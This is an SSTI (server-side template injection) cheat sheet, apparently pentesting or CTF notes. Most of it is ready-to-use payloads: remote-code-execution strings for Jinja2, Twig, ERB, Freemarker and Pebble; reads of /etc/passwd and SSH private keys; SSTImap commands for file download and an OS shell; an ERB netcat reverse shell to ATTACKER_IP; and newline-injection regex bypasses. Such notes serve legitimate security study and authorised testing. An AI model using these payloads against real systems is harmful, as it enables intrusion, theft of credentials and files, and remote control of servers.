# SSTI (Server-Side Template Injection)

[PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) | [SSTI Payloads](https://github.com/payloadbox/ssti-payloads)

---

## Confirm SSTI

### Break Template Syntax

```
${{<%[%'"}}%\.
```

If this causes a server error, SSTI is likely.

### Basic Math Test

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

If `49` appears, template is executing code.

---

## Identify Template Engine

| Payload | Result | Engine |
|---------|--------|--------|
| `${7*7}` | 49 | Freemarker, Thymeleaf, etc. |
| `{{7*7}}` | 49 | Jinja2, Twig, etc. |
| `{{7*'7'}}` | 7777777 | **Jinja2** |
| `{{7*'7'}}` | 49 | **Twig** |
| `<%= 7*7 %>` | 49 | ERB (Ruby) |
| `#{7*7}` | 49 | Pebble, Thymeleaf |

---

## Jinja2 (Python/Flask)

### Information Disclosure

```jinja2
# Dump config (includes secret keys)
{{ config.items() }}

# Dump builtins
{{ self.__init__.__globals__.__builtins__ }}
```

### Local File Read

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### RCE

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Alternative Paths to RCE

```jinja2
# Via request object
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# Via config object
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("whoami").read() }}

# Via import_string
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("id").read() }}
```

---

## Twig (PHP/Symfony)

### Information Disclosure

```twig
{{ _self }}
```

### Local File Read (Symfony only)

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

### RCE

```twig
{{ ['id'] | filter('system') }}
{{ ['cat /etc/passwd'] | filter('system') }}
{{ ['whoami'] | map('system') }}
```

---

## SSTImap (Automated Tool)

```bash
# Install
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt

# Auto-detect SSTI
python3 sstimap.py -u "http://TARGET/page?name=test"

# Download file
python3 sstimap.py -u "http://TARGET/page?name=test" -D '/etc/passwd' './passwd'

# Execute command
python3 sstimap.py -u "http://TARGET/page?name=test" -S id

# Interactive shell
python3 sstimap.py -u "http://TARGET/page?name=test" --os-shell
```

---

## Python eval() in f-string / format string

When user input is interpolated into a string that is then passed to **`eval()`** (e.g. `eval(f"f'''{template}'''")`), any field that allows **`{...}`**-style expressions can execute Python.

**Vulnerable code (Flask, XML-derived fields):**

```python
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # ...
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
```

**Regex bypassed:** `^[a-zA-Z0-9._'\"(){}=+/]+$` — allows `{`, `}`, `(`, `)`, `'`, `"`, `.`, etc., so a value like `{open("/root/root.txt").read()}` passes validation and is then evaluated inside the f-string.

**Exploit XML (file read):**

```xml
<patient>
    <firstname>John</firstname>
    <lastname>Doe</lastname>
    <sender_app>{open("/root/root.txt").read()}</sender_app>
    <timestamp>2222</timestamp>
    <birth_date>01/01/1985</birth_date>
    <gender>Male</gender>
</patient>
```

**RCE variant:**

```xml
<sender_app>{__import__('os').system('id')}</sender_app>
```

---

## Other Engines Quick Reference

### ERB (Ruby)

[TrustedSec - Ruby ERB Template Injection](https://trustedsec.com/blog/rubyerb-template-injection) | [PayloadsAllTheThings - Ruby SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md)

**Template syntax:** `<%= expression %>` — evaluates Ruby and outputs the result.

#### RCE

```erb
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= `whoami` %>
<%= `ls /` %>
```

#### File Read

```erb
<%= File.open('/etc/passwd').read %>
<%= File.open('/home/user/.ssh/id_rsa').read %>
```

If the file does not exist, `File.open` raises an exception — the app may return a 500 / Internal Server Error. Use this to confirm whether files exist.

#### Introspection

Enumerate available methods and instance variables to understand the app context:

```erb
<%= self.methods %>
<%= self.instance_variables %>
```

#### Reverse Shell via ERB

Wrap the command in backticks inside ERB tags:

```erb
<%= `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f` %>
```

#### Bypassing Input Validation with Newline Injection

When a Ruby/Sinatra app validates input with a regex like `=~ /^[a-zA-Z0-9\/ ]+$/`, the `^` and `$` anchors match **per-line**, not the entire string. Injecting a URL-encoded newline (`%0A`) before the SSTI payload puts the malicious content on a new line that passes validation.

**Vulnerable regex pattern (Ruby `=~` with `^$`):**

```ruby
params[:category] =~ /^[a-zA-Z0-9\/ ]+$/
```

Ruby's `^` matches start of any line and `$` matches end of any line. Compare with `\A` (start of string) and `\z` (end of string) which would block this bypass.

**Bypass — URL-encode `\n` + SSTI payload after valid input:**

```
category1=history%0A%3C%25%3D%207%20%2A%207%20%25%3E
```

Decoded, the server sees:

```
history
<%= 7 * 7 %>
```

The regex matches `history` on line 1 and `<%= 7 * 7 %>` never hits the check because `=~` already matched the first line. The template engine then evaluates the entire string including the SSTI payload.

**File read with newline bypass (URL-encoded):**

```
history%0A%3C%25%3D%20File.open%28%27%2Fetc%2Fpasswd%27%29.read%20%25%3E
```

**RCE with newline bypass (URL-encoded):**

```
history%0A%3C%25%3D%20%60whoami%60%20%25%3E
```

Use [urlencoder.org](https://www.urlencoder.org/) to encode payloads when Burp's encoder is not available.

**Reference:** [Bypassing Regular Expression Checks](https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/) — covers why `^$` differs from `\A\z` in Ruby.

#### Vulnerable Code Pattern (Sinatra + ERB.new)

The root cause is user input concatenated directly into an `ERB.new()` template string:

```ruby
@result = ERB.new("Your total grade is <%= ... %><p>" + params[:category1] + ": <%= ... %></p>").result(binding)
```

When `params[:category1]` contains ERB tags (after bypassing the regex), the template engine evaluates them. Look for this pattern in Ruby/Sinatra apps where `ERB.new` takes a string built with user input.

### Freemarker (Java)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Pebble (Java)

```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
```

---

## Resources

- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
